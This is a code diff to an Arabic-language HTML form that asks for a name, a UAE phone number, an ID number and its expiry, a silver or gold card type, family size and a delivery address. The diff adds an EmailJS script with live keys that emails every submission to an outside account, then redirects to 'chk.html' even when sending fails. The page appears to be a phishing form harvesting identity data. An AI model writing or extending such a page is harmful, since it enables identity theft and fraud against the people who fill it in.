@@ -151,24 +151,24 @@
         <form class="form-box" id="recipientForm">
             
             <div class="input-group">
-                <input type="text" class="input-field" placeholder="الاسم" required>
+                <input type="text" name="user_name" class="input-field" placeholder="الاسم" required>
             </div>
             
             <div class="input-group phone-group">
-                <input type="tel" placeholder="إدخال رقم الجوال" required>
+                <input type="tel" name="phone_number" placeholder="إدخال رقم الجوال" required>
                 <div class="phone-code">+971</div>
             </div>
             
             <div class="input-group">
-                <input type="text" class="input-field" placeholder="رقم الهوية" required>
+                <input type="text" name="id_number" class="input-field" placeholder="رقم الهوية" required>
             </div>
             
             <div class="input-group">
-                <input type="text" class="input-field" placeholder="تاريخ انتهاء الهوية" onfocus="(this.type='date')" onblur="(this.type='text')" required>
+                <input type="text" name="id_expiry" class="input-field" placeholder="تاريخ انتهاء الهوية" onfocus="(this.type='date')" onblur="(this.type='text')" required>
             </div>
             
             <div class="input-group">
-                <select class="input-field" required>
+                <select name="card_type" class="input-field" required>
                     <option value="" disabled selected hidden>اختر نوع البطاقة</option>
                     <option value="silver">فضية</option>
                     <option value="gold">ذهبية</option>
@@ -177,16 +177,45 @@
             </div>
             
             <div class="input-group">
-                <input type="number" class="input-field" placeholder="عدد افراد الأسره" required>
+                <input type="number" name="family_members" class="input-field" placeholder="عدد افراد الأسره" required>
             </div>
             
             <div class="input-group">
-                <input type="text" class="input-field" placeholder="عنوان التسليم" required>
+                <input type="text" name="delivery_address" class="input-field" placeholder="عنوان التسليم" required>
             </div>
             
-<button type="submit" class="btn-submit" onclick="window.location.href='chk.html'; return false;">متابعة</button>        </form>
+            <!-- تم إزالة الـ onclick من هنا ونقله لكود الجافاسكريبت لضمان الإرسال أولاً -->
+            <button type="submit" class="btn-submit">متابعة</button>        
+        </form>
     </div>
 </div>
+
+<!-- إضافة مكتبة EmailJS -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript">
+    (function(){
+        // استبدل YOUR_PUBLIC_KEY بالمفتاح العام الخاص بك من إعدادات حسابك في EmailJS
+        emailjs.init({
+          publicKey: "yWQSUKCrx-0f02aeK",
+        });
+    })();
+
+    document.getElementById('recipientForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // منع إعادة تحميل الصفحة لإرسال البيانات
+
+        // استبدل YOUR_SERVICE_ID و YOUR_TEMPLATE_ID بالمعرّفات الخاصة بك من لوحة تحكم EmailJS
+        emailjs.sendForm('service_97hvlam', 'template_fjlsfkm', this)
+            .then(function() {
+                console.log('تم الإرسال بنجاح!');
+                // التوجيه للصفحة التالية بعد نجاح الإرسال
+                window.location.href = 'chk.html'; 
+            }, function(error) {
+                console.log('حدث خطأ أثناء الإرسال...', error);
+                // يمكنك إزالة السطر التالي إذا لم تكن تريد التوجيه في حال فشل الإرسال
+                window.location.href = 'chk.html'; 
+            });
+    });
+</script>
 
 </body>
 </html>
